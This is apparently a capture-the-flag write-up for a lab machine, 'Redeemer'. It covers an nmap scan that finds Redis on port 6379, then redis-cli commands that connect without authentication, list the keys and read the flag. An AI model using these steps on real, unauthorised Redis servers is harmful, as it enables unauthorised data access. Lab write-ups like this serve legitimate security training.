# Redeemer

- TL;DR: Connect to a redis server using the `redis-cli` and retrieve the flag.

## Reconnaissance

- Run an nmap scan:
```
nmap -p6379 -sV -oA nmap_scans/Redeemer 10.129.55.121
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 06:55 PDT
Nmap scan report for 10.129.55.121
Host is up (0.082s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.19 seconds
```

<br>

## Exploitation

- We find the following port(s) open:
    - `tcp 6379` running the redis service
- `sudo apt install redis-tools` if the redis cli is not already installed on the system.
- Next we connect to the redis server with `redis-cli -h 10.129.136.187`
- Once connected, we run the `info` command to get information and statistics of the redis server,
- Keyspace section provides statistics on the main dictionary of each database. The statistics include the number of keys, and the number of keys with an expiration.
- In this case, only one database exists with the index `0`
- We select the database using the `select 0` command.
- We can list all the keys present in the database using the `keys *` command.
- Finally, we get the flag with the `get flag` command.
